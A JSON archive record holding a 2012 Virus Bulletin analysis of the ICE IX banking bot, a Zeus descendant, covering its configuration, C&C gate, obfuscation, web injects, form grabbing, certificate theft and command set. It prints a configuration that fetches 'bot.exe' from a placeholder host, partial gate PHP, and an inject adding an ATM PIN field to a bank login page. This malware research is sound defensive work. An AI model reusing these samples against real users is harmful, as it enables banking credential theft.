{
    "id": "a8793282-bc70-4baa-a8ec-e5499e189f05",
    "created_at": "2023-01-12T15:04:32.664047Z",
    "updated_at": "2025-03-27T02:12:11.142365Z",
    "deleted_at": null,
    "sha1_hash": "ff938cc1c78fff12d0b62112505a52079d57308b",
    "title": "2012-08-01 - Inside the ICE IX bot, descendent of Zeus",
    "authors": "",
    "file_creation_date": "2022-05-28T19:45:30Z",
    "file_modification_date": "2022-05-28T19:45:30Z",
    "file_size": 612394,
    "plain_text": "# Inside the ICE IX bot, descendent of Zeus\n\n**[virusbulletin.com/virusbulletin/2012/08/inside-ice-ix-bot-descendent-zeus](https://www.virusbulletin.com/virusbulletin/2012/08/inside-ice-ix-bot-descendent-zeus)**\n\n2012-08-01\n\n### Aditya K. Sood\n\nMichigan State University, USA\n\n### Richard J. Enbody\n\nMichigan Stat University, USA\n\n### Rohit Bansal\n\nSecNiche Security Labs, USA Editor: Helen Martin\n**Abstract**\n\nAditya Sood and colleagues present an analysis of ICE IX bot, a descendent of the Zeus bot\nwhich demonstrates how one bot can give rise to another.\n\nThe ICE IX bot is considered to be a descendent of the Zeus botnet because it uses some of\nZeus’s source code. ICE IX communicates using the HTTP protocol, so it can be considered\nto be a third generation botnet. While it has been used for a variety of purposes, a major\nthreat of ICE IX comes from its manipulation of banking operations on infected machines. As\nwith any bot, infection results in establishing a master-slave relationship between the\nbotmaster and the compromised machine.\n\nSome researchers do not consider ICE IX to be as effective as Zeus [1] – for example\nbecause of its code reuse, having fewer features, and so on. ICE IX implements the web\ninjects feature that was the core feature of the Zeus botnet. It also uses some of the\ninteresting code patterns from Zeus’s source. For example, the web injects module has been\noptimized to work effectively with different browsers. ICE IX implements enhanced drivermode code to bypass firewalls and protection software without raising any alarms. However,\nICE IX is still an interesting target for analysis and in this paper we present an analysis of the\nICE IX bot version < =1.2.0 to cover its different functionalities.\n\nThe roots of the name ICE IX may lie in literature: William Gibson’s 1984 novel Neuromancer\ncoined the term ‘ICE’, which stood for ‘Intrusion Countermeasure Electronics’, and the\ncentral theme of Kurt Vonnegut’s 1963 novel Cat’s Cradle was the ice-nine crystal – which\n\n\n-----\n\nspread to crystallize the water of the world. In the rest of the paper, we will shorten ICE IX to\nICE.\n\n## ICE bot building and configuration\n\nTo configure the ICE bot, several parameters are defined in the file settings.txt. This file\ncontains several sections, each defining various functions of the ICE bot. It is useful to begin\nwith the configuration settings because these expose the bot’s capabilities. The different\nconfiguration parameters of the ICE bot are as follows:\n\nautoupdate_path: this parameter defines the path of the executable file (hosted in a\nremote location) that the ICE bot downloads to update itself when configuration\nparameters change.\n\nreceiving_script_path: this parameter defines a path to the gateway that the ICE bot\nuses to connect back to its Command and Control (C&C) server. ICE uses this\nconnection to pass on information extracted from the compromised machines.\n\ninjects_file: this parameter defines a path to the web injects file which contains rule sets\nfor altering incoming HTTP responses to inject illegitimate content into web pages.\n\nDataGrabFilters: this parameter defines filters for grabbing content in web pages.\n\nURLRedirects: this parameter defines redirection rules for particular domains, allowing\nthe browser to serve a fake web page when a legitimate domain name is entered in the\naddress bar.\n\nMirrorServers: this parameter defines a path for backup servers that store the different\nconfiguration files for the ICE bot. If a primary server becomes unavailable, this option\nacts as a secure failover so the bot can download other versions of configuration files\nfrom mirror (backup) servers.\n\nURIMasks: this parameter specifies various masks (a.k.a. rules) for customizing\noperations on different websites. The ‘N’ flag specifies that the ICE bot should not write\nany data in its reports. The ‘S’ flag instructs the bot to take a screenshot of the web\npage specified in the URI. The ‘C’ flag instructs the bot to manage the cookie handling\nsupport for the masked URI so it can preserve and delete the cookies associated with\nthe domain. The ‘B’ flag blocks access to the website specified in the masked URI.\n\nA simple example of an ICE bot configuration file is presented in Listing 1 below:\n\n\n-----\n\n```\n{ Settings \n autoupdate_path “http://hacked_domain/bot.exe&rdquo;\n receiving_script_path “http://hacked_domain/script.php&rdquo;\n injects_file “web_injects.txt”\n {\"DataGrabFilters\"\n  ; “Http://mail.rambler.ru/ *” “passw; login”\n }\n {“URLRedirects”\n   “Http://www.rambler.ru&rdquo; “http://www.yandex.ru&rdquo; “GP” “” “”\n }\n {“MirrorServers”\n  “http://backup_domain/config_backup_v_1.bin&rdquo;\n }\n   URI mask\n {“URLMasks”e \n  “Nhttp: / / * wellsfargo.com / *”\n  “Nhttp: / / citibank.com / *”\n  “S * / chase.com / *”\n  “S * / bankofamerica.com / *”\n } }\nListing 1: Example layout of an ICE bot configuration file.\n\n```\nOnce the configuration parameters have been defined in the settings file, it’s time for the\nbuilder to generate a bot that uses the following specific build parameters:\n\nConfiguration File – path to the configuration file containing settings parameters.\n\nConfiguration File Retrieval Time – specifies the time interval to be set for successful\nretrieval of the configuration file from the server.\n\nStatistics Retrieval Time – specifies the time interval for sending information back to the\nC&C server.\n\nEncryption Key – the RC4 encryption key used for encrypting the configuration file.\n\nCertification Deletion – deletes certificates from the infected machine after installation\nof the bot.\n\nDisable TCP Operations – stops various TCP servers including SOCKS, VNC, etc. that\nare used as backconnect servers.\n\nOther configuration parameters exist, but the primary ones are those discussed above.\n(More detail is provided in the appendix.)\n\n## Understanding the gate communication\n\n\n-----\n\nThe gate acts as an interface between the C&C server and the infected machine. The bot\nconnects to the gate, which in turn connects to the C&C server. Thus, the bot does not send\ninformation directly to the C&C server, but instead routes it through the intermediate gate.\nThis gate organization provides a more modular architecture and it is possible to host the\nC&C server on a different domain from the gate. However, the gate and C&C server are\nusually hosted on the same domain. From a design perspective, gate.php depends on the\nconfig.php and global.php files.\n\nListing 2 shows how the C&C server sends the configuration file (settings.bin) in response to\na request from the bot sent through the gate. The bot sends a unique identifier and a\ncomputed hash from the infected machine in the HTTP POST parameters. Once the gate\nreceives the information, it executes the custom code in the config.php file. The configuration\nmodule then verifies the hash by recomputing it on the server side. This check validates the\nsuccessful installation and identity of the bot. The configuration module executes an RC4\nencryption routine and implements MD5 on the string returned by the RC4 encryption\nroutine. The identifier ($id) is passed as a parameter to the RC4 encryption with the\nencryption key (rc4Init ($plainkey)) that was established during the installation of the bot.\nOnce the hash is computed, it is verified against the hash transmitted by the bot. If the\nhashes match, the C&C server serves the settings.bin file over HTTP as an attachment. The\nfile encoding is always defined as binary and is served as plain text content over HTTP. In\nthis way, the configuration file is sent to the bot in the infected machine.\n\n\n-----\n\n```\n<?php\n$plainkey=’[Encryption key to be used]’;\n$config_file=’settings.bin’;\n$id=$_POST[‘bn1’];\n$hash=$_POST[‘sk1’];\n$originalId=$id;\nfunction rc4Init($key){-- Redacted --}\nfunction rc4(&$data, $key) {-- Redacted --}\nrc4($id,rc4Init($plainkey));\n$hashtocompare=strtoupper(md5($id));\n$data=”originalId=$originalId hash=$hash hashtocompare=$hashtocompare\\n”;\nif ($hashtocompare==$hash)\n   {\n   header(‘Content-Type: text/plain’);\n   header(‘Content-Disposition: attachment; filename=’ . $config_file);\n   header(‘Content-Length: ‘ . filesize($config_file));\n   header(‘Content-Transfer-Encoding: binary’);\n   readfile($config_file);\n   }\nelse\n   {\n   header($_SERVER[‘SERVER_PROTOCOL’].” 404 Not Found”);\n   }\n?>\nListing 2: ICE bot configuration module.\n\n```\nOur disassembly of the ICE bot binary yielded results similar to those shown in Listing 2.\nFigure 1 shows how the ICE bot uses variables ‘bn1’ and ‘sk1’ to extract information from the\ninfected machine. The ‘bn1’ variable holds the unique value of an identifier, while the ‘sk1’\nvariable holds the hash value.\n\n\n-----\n\n**Figure 1. Parameters extracting ID and hash information.**\n\nFigure 2 shows how the ICE bot generates the hash. It implements the CryptHashData and\nCryptCreateHash functions to handle hash operations. The bot keeps sending HTTP POST\nrequests back to the C&C server to notify it of any updates in the system and to send\nextracted information. The HTTP POST request sent back to the gate is presented in Listing\n3.\n\n\n-----\n\n**Figure 2. Hash generation process.**\n\n\n-----\n\n```\n  Redacted Content\nPOST /private/adm/gate.php HTTP/1.1\nAccept: */*\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR \n2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)\nHost: 4umf.com\nConnection: Keep-Alive\n.......Nl.&]s.T.(.9.C..R.cF^Zrf.=A....6[..+.aq..f....;^.a.\\.w..O?...KFa,X..i....j.k..&\n[email protected]^N.....43.h..R.0r.g......w.m8..._............h...\\@..C.n....3...W....\n3..,...0..k..sxp..p...8..|..[ ...AD.<.._.k..”!....\\..B..;.)..~MZ.;U..]B.R..`..S....\nz...a..y..`........N.>E...bD.F....o8d...|...dS..l.l.j....r..H...n.O....`....P.....\nw.y..%..Ikj...{........K....6.~...._..^E...UP9..|SN.#.C+...]..U...?..g............\n.....ZM.Q0.Z.....!W....Q.s...g.............:z.8..q’.q...3......L..M.....0......5’m.\n......2>.......].c....i..R.S.v..........w..k.\\..jU....$....SIV9EWl6.L.`N9*....)...\n...?r{.M.kt.IZ.f...6H.......\\.4I.....=:l.o..QQ.......yV...\nHTTP/1.1 200 OK\nDate: Mon, 11 Jun 2012 03:50:51 GMT\nServer: Apache/2.2.14 \nConnection: Keep-Alive\nContent-Type: text/html\n{.”..a1]....S.=.W..t.s.........^@...........RW8V..q.X..w.W...’).\nListing 3: POST request in action.\n\n```\nAnother interesting fact is that the bot generates fake HTTP traffic to google.com/webhp.\nWhenever the bot sends information back to the gate using HTTP POST requests, it also\nsends HTTP GET requests to google.com. The result is fake traffic so that the HTTP\nrequests look legitimate. Figure 3 shows how the ICE bot generates traffic.\n\n**Figure 3. ICE bot traffic**\n\n\n-----\n\n```\n  Redacted Content\nif($replyCount > 0)\n{\n $replyData = pack(‘LLLLLLLL’, mt_rand(), mt_rand(), mt_rand(), mt_rand(), mt_rand(),\nHEADER_SIZE + \nstrlen($replyData), 0, $replyCount).md5($replyData, true).$replyData;\n visualEncrypt($replyData);\n rc4($replyData, $config[‘botnet_cryptkey_bin’]);\n echo $replyData;\n die();\n }\n}\nfunction sendEmptyReply()\n{\n $replyData = pack(‘LLLLLLLL’, mt_rand(), mt_rand(), mt_rand(), mt_rand(), mt_rand(),\nHEADER_SIZE + \nITEM_HEADER_SIZE, 0,\n1).”\\x4A\\xE7\\x13\\x36\\xE4\\x4B\\xF9\\xBF\\x79\\xD2\\x75\\x2E\\x23\\x48\\x18\\xA5\\0\\0\\0\\0\\0\\\n0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0”;\n visualEncrypt($replyData);\n rc4($replyData, $GLOBALS[‘config’][‘botnet_cryptkey_bin’]);\n echo $replyData;\n die();\n}\nfunction visualEncrypt(&$data)\n{\n $len = strlen($data);\n for($i = 1; $i < $len; $i++)$data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));\n}\nfunction visualDecrypt(&$data)\n{\n $len = strlen($data);\n if($len > 0)for($i = $len - 1; $i > 0; $i--)$data[$i] = chr(ord($data[$i]) ^\nord($data[$i - 1]));\n}\nListing 4: Data obfuscation.\n\n```\nListing 4 shows some of the obfuscation routines implemented in the ICE bot. When the bot\nsends information to the gate, the C&C can either send an empty reply or one containing\nsome data, depending on the requirements. When the C&C has to send an empty reply, it\nsimply executes sendEmptyReply. To send a reply containing commands and data, the C&C\nserver queries its database and then replies. The C&C server implements its visualEncrypt\nfunction to obfuscate the data, followed by an RC4 encryption routine that uses a predefined\ncrypto key to encrypt the full stream and then sends it back to the bot. On receiving the\nstream of data, the bot implements the decryption routine to extract the command sent by\nthe C&C server. Listing 5 shows an example of the data transmitted over the wire during\ncommunication between the bot and the C&C server.\n\n\n-----\n\n```\n\\240\\321\\373c\\333\\266\\262\\3433l\\201\\332\\314\\022\\223D\\022X\\237\\3277\\320\\272$\\241\\0250(!\n021F.Qa\\031\\001’’@\\361\\364\\233\\365J\\245\\322t\\3730U\\324}\\\n[email protected]\\262|\\204\\212D\n\\360P\\264v\\231\\303QD\\324\\206\\210\\300wV\\n\n\\211\\275\\311\\301\\3308\\337\\265+\\256\\032?’.\\006\\022\\362\\354C\\036I!^n\\026\\016((O\\376\\373\\\n{\\364?Z\\333r\\373O\\275s\\213\\205K\nListing 5: Obfuscated data – ICE bot communication.\n\n```\nWe have now covered the communication model of ICE bot.\n\n## ICE bot web injects\n\nICE bot’s web injects are similar to those used by Zeus and SpyEye, except that they have\nbeen redesigned and optimized for better performance. They provide improved functionality\nto inject data with more successful results. Web injection is a technique in which a bot injects\nmalicious content into the incoming HTTP responses. The injected content tricks the user\ninto entering sensitive information. Details of web injects can be found in [2], [3]. Listing 6\nshows the content from a webinjects.txt file used by an ICE bot to trigger injections.\n```\nset_url https://online.wellsfargo.com/das/cgi-bin/session.cgi* GL\ndata_before\n<div id=”pageIntro” class=”noprint”>\ndata_end\ndata_inject\ndata_end\ndata_after\n<td id=”sidebar” align=”left” valign=”top” class=”noprint”>\ndata_end\nset_url https://www.wellsfargo.com/* G\ndata_before\n<span class=”mozcloak”><input type=”password”*</span>\ndata_end\ndata_inject\n<br><strong><label for=”atmpin”>ATM PIN</label>:</strong>&nbsp;<br />\n<span class=”mozcloak”><input type=”password” accesskey=”A” id=”atmpin” name=”USpass”\nsize=”13” maxlength=”14” \nstyle=”width:147px” tabindex=”2” /></span>\ndata_end\ndata_after\ndata_end\n----- Redacted Content ----Listing 6: ICE bot web injects in action.\n\n## ICE bot – form grabbing\n\n```\n\n-----\n\nForm grabbing is another technique implemented by many recent bots. As the name\nsuggests, a bot captures (‘grabs’) all the data in a form when it is submitted using POST\nrequests. This technique is implemented using DLL injection and hooking to implement a\nman-in-the-middle-style attack within the browser. This attack, known as a man-in-thebrowser attack, allows the bot to manipulate the data that is coming in and going out of the\nsystem. Form grabbing is a very successful technique for stealing users’ credentials, and all\nbrowsers are vulnerable. This is because form grabbing does not exploit any inherent\nvulnerabilities or design flaws in the browser components; rather it subverts the integrity of\nrunning components by hooking different functions in the browser-specific DLLs. Details of\nthe form grabbing technique can be found in [4]. The bot hooks wininet.dll and nspr4.dll to\nsubvert the normal operations of Internet Explorer (IE) and Firefox respectively. Figure 4\nshows how the stolen information is stored in the C&C after successful form grabbing.\n\n**Figure 4. ICE bot form grabbing in action.**\n\nBecause of where it sits, form grabbing works over both HTTP and HTTPS protocols. In\naddition to stealing data from forms, a similar tactic can be used to grab .sol files (Flash\nsettings) and cookies. The ICE bot also has special built-in grabbers for particular purposes.\n\n\n-----\n\nFor example, it has grabbers to extract the credentials from FTP clients such as FlashFXP,\n_Total Commander, WsFTP, FileZilla, FAR Manager, WinSCP, FTP Commander, CoreFTP,_\n_SmartFTP, and from mail clients such as Windows Mail, Live Mail and Outlook._\n\n## Self-destructive code\n\nICE bot implements melting, in which it deletes the dropper program after successful\ninstallation. The dropper is the malicious binary that was served during a drive-by download\nattack. Once it has installed the bot, the dropper is no longer needed so it deletes itself. The\ndropper can also be thought of as a loader because it loads the ICE bot into the system and\nthen removes its initial footprint.\n\nFigure 5 shows a code snippet extracted during analysis of ICE bot. In this snippet, the\nprogram has built-in batch instructions that are executed after dropping the bot. One can see\nthat the ‘del’ command is used with option ‘/F’ that forcefully deletes the files in the directory.\n\n**Figure 5. Self-destructive code.**\n\n## User-Agent detection\n\nFigure 6 shows that the ICE bot uses its ObtainUserAgentString function to retrieve the\ndefault User-Agent string used by the browser in the infected system. Using this information,\nthe details of the infected machine are sent back to the C&C server, including the type of\n\n\n-----\n\noperating system, browser and other environment-specific information. This communication\nallows the botmaster to understand the state of infected machines and to fine-tune the\ninfection.\n\n**Figure 6. Extracting User-Agent information.**\n\n## Certificate deletion process\n\nICE bot uses a built-in Windows API function to delete certificates from the certificate store.\nThe motive behind deleting the certificates is to remove the encryption implemented on the\nend points. Primarily, the bot is interested in deleting certificates that are associated with\nprivate keys belonging to the user.\n\nThis allows the bot to remove the identity and authentication information present in\ncertificates. After this, when a user imports a new certificate, these are captured and stored\non the C&C server for later use. The process is executed as follows:\n\nICE bot opens the certificate store using the CertOpenSystemStore API. It typically has\ntwo parameters. The important one is szSubsystemProtocol, which defines the name of\nthe store. There are four different attributes associated with the szSubsystemProtocol:\nCA refers to the certification authority, ROOT refers to the root certificates, SPC refers\nto the Software Publishing Certificate and MY points to the certificate store that has\ncertificates associated with private keys. ICE bot uses MY szSubsystemProtocol to\nquery the certificate store.\n\n\n-----\n\nUpon successful opening of the store, ICE bot enumerates the list of certificates using\nCertEnumCertificatesInStore in a loop. Using CertDuplicateCertificateContext, it\nduplicates the certificate context which contains a handle to the certificate store. This is\ndone to retrieve a handle for each unique certificate individually, by incrementing and\ndecrementing the reference count.\n\nFinally, the ICE bot deletes the certificate from the store using\nCertDeleteCertificateFromStore, and then closes the store using CertCloseStore.\n\nIt also implements the PFXExportCertStoreEx function, which exports certificates and\nassociated public keys from the certificate store. Figure 7 shows the certificate deletion\nprocess in action.\n\n**Figure 7. Deleting certificates from an infected system.**\n\n## Registry check and command execution\n\nWhen an ICE bot is installed, it modifies the registry settings by creating new registry keys.\nListing 7 shows the behaviour of ICE bot pertaining to registry modifications and disk\noperations.\n\n\n-----\n\n```\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|Microsoft Firevall Engine\n(Trojan.Agent) -> \nData: c:\\windows\\iqs.exe\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|Microsoft Firevall Engine\n(Trojan.Agent) -> \nData: c:\\windows\\iqs.exe\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|{BC7B83DC-3CBF-5AA3-5606123385554906} \n(Trojan.ZbotR.Gen) -> Data: “C:\\Documents and Settings\\Administrator\\Application\nData\\Fox\\bolifa.exe”\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Terminal\nServer\\Install\\Software\\Microsoft\\Windows\\\nCurrentVersion\\Run|Microsoft Firevall Engine (Trojan.Agent) -> Data:\nc:\\windows\\iqs.exe\nListing 7: Registry keys created by ICE bot.\n\n```\nA registry key with the name ‘Microsoft Firevall Engine’ is created, which has an entry in the\nsystem startup. It uses a similar naming convention to the Microsoft firewall in order to be\nless suspicious. However, the bot can generate random binary names and registry keys to\nincrease the complexity. To trigger command execution, the bot executes the inbuilt Windows\nAPI to subvert the functionality of the operating system. For example: in rebooting and\nshutting down the system, the bot uses ExitWindowsEx and InitiateSystemShutdownExW.\nFigure 8 shows the command execution behaviour.\n\n**Figure 8. System shutdown module.**\n\n## Backconnect and supporting modules\n\n\n-----\n\nBackconnect is an interesting technique that is based on the concept of reverse proxying, in\nwhich the reverse proxy agent takes requests from the servers and forwards them to the\nmachines present in the internal network. When the infected system is situated behind a\nNetwork Address Translation (NAT) bridge, malware authors implement the backconnect\nmodule. The backconnect server hides the identity of the C&C servers on the Internet. It is a\nstealthy way of sending commands to infected machines inside the network used by C&C\nservers. The Secure Sockets (SOCKS) protocol is designed specifically to bypass Internet\nfiltering systems and perimeter-level security. SOCKS proxies are considered as a\ncircumvention tool to bypass firewalls and make successful connections using raw TCP\nsockets. HTTP and SOCKS are used to route communication packets through firewalls. ICE\nbot implements SOCKS proxy with backconnect support. In addition, it also supports the\nVNC remote management module. It also implements a screen-capturing module, in which\nthe botmaster defines the rules for capturing screenshots of target websites.\n\n## Conclusion\n\nIn this paper, we have presented an analysis of the ICE IX bot, a descendent of the Zeus bot.\nIt uses techniques similar to those of Zeus with some modifications and optimizations. The\norigin of ICE bot demonstrates how one bot can give rise to another, and how botnets –\nwhich are still a threat – are evolving to be more robust and effective.\n\n### Bibliography\n\n[1] Tarakanov, D. Ice IX: Not Cool At All. http://threatpost.com/en_us/blogs/ice-ix-not-cool-all091411.\n\n[2] Sood, A.K. (SpyEye & Zeus) Web Injects – Parameters.\n[http://secniche.blogspot.com/2011/07/spyeye-zeus-web-injects-parameters-and.html.](https://secniche.blogspot.com/2011/07/spyeye-zeus-web-injects-parameters-and.html)\n\n[3] Sood, A.K. Botnets and Browser - Brothers in the Ghost Shell.\n[http://secniche.org/presentations/brucon_brussels_2011_adityaks.pdf.](http://secniche.org/presentations/brucon_brussels_2011_adityaks.pdf)\n\n[4] Sood, A.K.; Enbody, R.J.; Bansal, R. The art of stealing banking information – form\ngrabbing on fire. Virus Bulletin, November 2011, p.19.\n[http://www.virusbtn.com/virusbulletin/archive/2011/11/vb201111-form-grabbing.](http://10.10.0.46/virusbulletin/2011/11/art-stealing-banking-information-form-grabbing-fire%0A)\n\n## Appendix: ICE IX bot commands\n\nCommands Explanation\n\nbot_uninstall Uninstalling bot from the infected machine\n\nbot_update Scanning bot for checking the applied configuration and required\nupdates\n\n\n-----\n\nbot_update_exe Updating bot remotely with new configuration\n\nbot_bc_add Creating backconnect connection with the bot\n\nbot_bc_delete Removing backconnect connection with the bot\n\nbot_httpinject_disable Disabling web injects functionality of the bot\n\nbot_httpinject_enable Enabling web injects functionality of the bot\n\n**Table 1. Bot controlling commands**\n\nCommands Explanation\n\nuser_destroy Destroy the infected machine\n\nuser_logoff Killing active user session on the infected machine\n\nuser_execute Download and execute remote executable on the infected\nmachine\n\nuser_cookies_get Extract the cookies from stored and active browser session\n\nuser_cookies_remove Delete the cookies\n\nuser_certs_get Extract specific certificate from the infected machine\n\nuser_certs_remove Delete certificates from the infected machine\n\nuser_url_block Block access to a specific domain on the Internet\n\nuser_url_unblock Unblock access to a restricted domain\n\nuser_homepage_set Set the default home page of the browser\n\nuser_flashplayer_get Extract settings of Sol files from the infected machine\n\nuser_flashplayer_remove Delete Sol files from the infected machine\n\nos_shutdown Shut down infected machine\n\nos_reboot Reboot infected machine\n\n**Table 2. System manipulation commands.**\n\n## Latest articles:\n\n### Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency\n\n\n-----\n\nTeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order\nto infiltrate organizations’ dedicated environments and transform them into attack\nlaunchpads. In this article Aditya Sood presents a new module introduced by…\n\n### Collector-stealer: a Russian origin credential and information extractor\n\nCollector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to\nexfiltrate sensitive data from end-user systems and store it in its C&C panels. In this article,\nresearchers Aditya K Sood and Rohit Chaturvedi present a 360…\n\n### Fighting Fire with Fire\n\nIn 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and\nfrom that moment onward, was intrigued by the properties of these small pieces of selfreplicating code. Joe Wells was an expert on computer viruses, was partly…\n\n### Run your malicious VBA macros anywhere!\n\nKurt Natvig wanted to understand whether it’s possible to recompile VBA macros to another\nlanguage, which could then easily be ‘run’ on any gateway, thus revealing a sample’s true\nnature in a safe manner. In this article he explains how he recompiled…\n\n### Dissecting the design and vulnerabilities in AZORult C&C panels\n\nAditya K Sood looks at the command-and-control (C&C) design of the AZORult malware,\ndiscussing his team's findings related to the C&C design and some security issues they\nidentified during the research.\n\n[Bulletin Archive](https://www.virusbulletin.com/virusbulletin/archive)\n\n_Copyright © 2012 Virus Bulletin_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2012/2012-08-01 - Inside the ICE IX bot, descendent of Zeus.pdf"
    ],
    "report_names": [
        "2012-08-01 - Inside the ICE IX bot, descendent of Zeus.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f809bfcb-b200-4988-80a8-be78ef6a52ef",
            "created_at": "2023-01-06T13:46:39.186988Z",
            "updated_at": "2025-03-27T02:00:03.016358Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "Adept Libra"
            ],
            "source_name": "MISPGALAXY:TeamTNT",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c3ca592f-0669-49bd-ab5c-310007ab2fb4",
            "created_at": "2022-10-25T15:50:23.334495Z",
            "updated_at": "2025-03-27T02:00:55.445098Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "TeamTNT"
            ],
            "source_name": "MITRE:TeamTNT",
            "tools": [
                "Peirates",
                "MimiPenguin",
                "LaZagne",
                "Hildegard"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535872,
    "ts_updated_at": 1743041531,
    "ts_creation_date": 1653767130,
    "ts_modification_date": 1653767130,
    "files": {
        "pdf": "https://archive.orkl.eu/ff938cc1c78fff12d0b62112505a52079d57308b.pdf",
        "text": "https://archive.orkl.eu/ff938cc1c78fff12d0b62112505a52079d57308b.txt",
        "img": "https://archive.orkl.eu/ff938cc1c78fff12d0b62112505a52079d57308b.jpg"
    }
}